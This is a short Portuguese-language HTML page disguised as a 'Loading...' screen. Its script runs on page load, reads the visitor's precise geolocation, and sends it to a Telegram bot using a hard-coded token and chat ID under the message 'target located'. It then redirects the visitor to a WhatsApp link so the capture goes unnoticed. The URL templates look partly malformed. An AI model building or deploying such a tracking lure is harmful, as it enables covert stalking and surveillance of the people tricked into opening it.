<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carregando...</title>
</head>
<body>
    <script>
        const TOKEN = "8668803114:AAFyGRW2uBxoHybsY6HxCiEEn_X4n4HgXDI";
        const CHAT_ID = "5987538773";
        const LINK_REDIRECIONAR = "https://wa.me/559392192017"; 

        function enviarTelegram(lat, lon) {
            const msg = `📍 ALVO LOCALIZADO!\n\nMapa: https://google.com{lat},${lon}`;
            const url = `https://telegram.org{TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`;
            
            fetch(url).finally(() => {
                window.location.href = LINK_REDIRECIONAR;
            });
        }

        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        enviarTelegram(pos.coords.latitude, pos.coords.longitude);
                    },
                    (err) => {
                        window.location.href = LINK_REDIRECIONAR;
                    },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else {
                window.location.href = LINK_REDIRECIONAR;
            }
        };
    </script>
</body>
</html>
